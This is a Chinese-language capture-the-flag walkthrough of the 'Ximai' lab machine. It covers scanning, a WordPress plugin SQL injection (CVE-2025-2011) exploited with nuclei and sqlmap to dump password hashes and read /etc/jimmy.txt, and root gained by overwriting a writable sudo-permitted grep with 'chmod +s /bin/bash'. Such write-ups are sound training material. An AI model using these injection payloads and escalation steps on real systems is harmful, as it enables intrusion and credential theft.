# 一、信息收集

## 网络扫描

首先进行网络发现，寻找目标主机：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.131 08:00:27:f4:eb:fa       PCS Systemtechnik GmbH
...
```

发现目标IP：`192.168.205.131`

## 端口扫描

对目标进行全端口扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.131            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 06:55 EDT
Nmap scan report for SOUPEDECODE.LOCAL (192.168.205.131)
Host is up (0.000082s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8000/tcp open  http-alt
MAC Address: 08:00:27:F4:EB:FA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds
```

开放端口：

- 22/tcp - SSH服务
- 80/tcp - Web服务
- 3306/tcp - MySQL数据库
- 8000/tcp - 备用Web服务

# 二、服务枚举

## MySQL服务测试

尝试连接MySQL服务：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ mysql -h 192.168.205.131 -u root -p 
Enter password: 
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.205.128' is not allowed to connect to this MariaDB server
```

MySQL服务拒绝远程连接，需要寻找其他入口。

## Web服务分析（80端口）

访问80端口显示Apache2默认页面，进行目录扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -u 192.168.205.131     
...
[07:15:39] 200 -    2KB - /adminer.php
[07:15:46] 200 -   23KB - /info.php
...
```

继续使用gobuster进行更详细的扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.131 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64 
...
/index.html           (Status: 200) [Size: 10938]
/info.php             (Status: 200) [Size: 85870]
/reminder.php         (Status: 200) [Size: 3163]
/server-status        (Status: 403) [Size: 280]
...
```

发现的重要文件：

- `/adminer.php` - Adminer 5.3.0数据库管理工具
- `/info.php` - PHP信息页面
- `/reminder.php` - 提醒页面

## 分析reminder.php页面

访问`/reminder.php`，发现包含重要信息：

```html
<div class="container">
    <h1>Web Portal</h1>
    <p class="hint-text">
        jimmy! Don't forget we need to harden the security on the web server. In case you have forgotten your access details, I've put them in a txt file for you. It's in that place where I put that thing that time.
    </p>

    <img src="that-place-where-i-put-that-thing-that-time/1b260614-3aff-11f0-ac81-000c2921b441.jpg" alt="Mysterious Image">

    <p>
        Also, can you fix this search box? Sometimes it chucks errors depending on what I enter...
    </p>
    <p class="hint-text">
        I'd do it myself, but I've been busy trying to create some code to enable us to securely store our passwords, seeing as you keep forgetting yours... The encoder seems completely borked though.
    </p>

    <form action="reminder.php" method="POST">
        <input type="text" name="username" placeholder="Username">
        <input type="submit" value="Lookup User">
    </form>
</div>
```

页面提供了重要线索：

1. Jimmy的访问凭据存储在txt文件中
2. 路径提示：`that-place-where-i-put-that-thing-that-time/`

访问该路径，发现目录列表：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.131/that-place-where-i-put-that-thing-that-time/
...
lrwxrwxrwx 1 root root   15 May 17 18:42 creds.txt -> /etc/jimmy.txt
...
```

发现`creds.txt`是指向`/etc/jimmy.txt`的软链接。

## Web服务分析（8000端口）

访问8000端口发现是WordPress站点，但域名跳转到`wordpress.local`，需要添加到hosts文件：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo "192.168.205.131 wordpress.local" >> /etc/hosts
```

WordPress站点包含一篇重要文章，提示系统存在安全问题：

```
Dear Developer, We Need to Talk…

While casually browsing your blog system, I couldn't help but notice a few… quirks.

For starters, your php.ini is a bit too welcoming. mysqli.allow_local_infile = On? Really? That's basically sending an open invitation to anyone with a payload and a dream.

Oh, and your CMS? Some of those plugins are a little too trusting. I tried asking the database a slightly unexpected question, and to my surprise… it answered. Very helpfully, in fact.🧐

Don't worry—nothing happened (yet). But if I found these issues, someone less polite might too.

Just a friendly heads-up: hardening is cheaper than recovering. 😅

Sincerely,
A Concerned Internet Wanderer
```

文章暗示：

1. `mysqli.allow_local_infile = On` 配置可能存在安全风险
2. WordPress插件存在SQL注入漏洞

# 三、漏洞发现与利用

## 漏洞扫描

使用nuclei进行漏洞扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nuclei -u http://wordpress.local:8000/
...
[CVE-2025-2011:dbname] [http] [high] http://wordpress.local:8000/wp-admin/admin-ajax.php?s=9999')union+select+111,222,(select(concat(0x44617461626173653a20,database()))),4444,+5--+-&perpage=20&page=1&orderBy=source_id&dateEnd&dateStart&order=DESC&sources&action=depicter-lead-index ["wordpress"]
...
```

发现CVE-2025-2011漏洞，这是一个WordPress插件的SQL注入漏洞。

## SQL注入利用

### 检测注入点

使用sqlmap验证并利用SQL注入漏洞：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -u "http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test&action=depicter-lead-index" -p s --dbs --batch
...
Parameter: s (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: s=test') AND (SELECT 1426 FROM (SELECT(SLEEP(5)))CoXd) AND ('Jhem'='Jhem&action=depicter-lead-index

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: s=test') UNION ALL SELECT CONCAT(0x71786b7071,0x72534350746463506a707173537277566e717679657645616d6c774751594a486675525970544a54,0x717a6a7171),NULL,NULL,NULL,NULL-- -&action=depicter-lead-index
...
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] wordpress
[*] zabbix
```

### 获取WordPress用户信息

提取WordPress用户表数据：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -u "http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test&action=depicter-lead-index" -p s -D wordpress -T wp_users --dump       
...
Database: wordpress
Table: wp_users
[1 entry]
+----+----------+-----------------------------------------------------------------+-----------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url | user_pass                                                       | user_email      | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+----------+-----------------------------------------------------------------+-----------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | <blank>  | $wp$2y$10$ylcSQukwQZAMcFcQTmFzVuJhcr6CoEflSJs6pSiA9OG0JWOpAEYVq | no@thankyou.com | adminer    | 0           | adminer      | adminer       | 2025-05-28 10:35:26 | <blank>             |
+----+----------+-----------------------------------------------------------------+-----------------+------------+-------------+--------------+---------------+---------------------+---------------------+
```

获得用户：`adminer`，密码哈希：`$wp$2y$10$ylcSQukwQZAMcFcQTmFzVuJhcr6CoEflSJs6pSiA9OG0JWOpAEYVq`

### 读取系统文件

利用MySQL的LOAD_FILE函数读取`/etc/jimmy.txt`：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -u "http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test&action=depicter-lead-index" -p s --sql-query "SELECT LOAD_FILE('/etc/jimmy.txt')" --batch
...
SELECT LOAD_FILE('/etc/jimmy.txt'): 'HandsomeHU\n'
```

成功获取jimmy用户密码：`HandsomeHU`

# 四、系统访问

## SSH登录

使用获取的凭据登录SSH：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh jimmy@192.168.205.131                                                                                                                                    
jimmy@192.168.205.131's password: 
Linux Ximai 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
...
jimmy@Ximai:~$ echo $PATH
./...
```

发现PATH环境变量被限制，需要重新设置：

```bash
jimmy@Ximai:~$ export PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
```

## 信息收集

检查sudo权限和系统信息：

```bash
jimmy@Ximai:~$ sudo -l
Sorry, user jimmy may not run sudo on Ximai.
```

查看WordPress配置文件：

```bash
jimmy@Ximai:/var/www/wordpress$ cat wp-config.php 
...
/**
 * adminer:adminer123456
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'root' );

/** Database password */
define( 'DB_PASSWORD', 'SuperSecret' );
...
```

在配置文件中发现adminer用户的明文密码：`adminer123456`

# 五、权限提升

## 切换用户

使用获取的密码切换到adminer用户：

```bash
jimmy@Ximai:/tmp$ su adminer
Password: 
adminer@Ximai:/tmp$ sudo -l
Matching Defaults entries for adminer on Ximai:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User adminer may run the following commands on Ximai:
    (ALL) NOPASSWD: /usr/bin/grep
```

## 利用sudo权限

发现adminer用户可以以root权限执行`/usr/bin/grep`命令，但存在限制。检查grep文件权限：

```bash
adminer@Ximai:/tmp$ ls -la /usr/bin/grep
-rwxr-xrwx 1 root root 19 Aug 30 23:32 /usr/bin/grep
```

发现grep文件具有写权限，可以覆盖其内容：

```bash
adminer@Ximai:/tmp$ echo 'chmod +s /bin/bash' > /usr/bin/grep
adminer@Ximai:/tmp$ sudo /usr/bin/grep
adminer@Ximai:/tmp$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

成功为bash文件设置SUID权限，获取root权限：

```bash
adminer@Ximai:/tmp$ bash -p
bash-5.0# cat /root/r00t.txt /home/jimmy/us3r.txt 
flag{root-126e5653-3b02-11f0-b074-000c2921b441}
flag{user-ffbea0a7-3b01-11f0-9160-000c2921b441}
```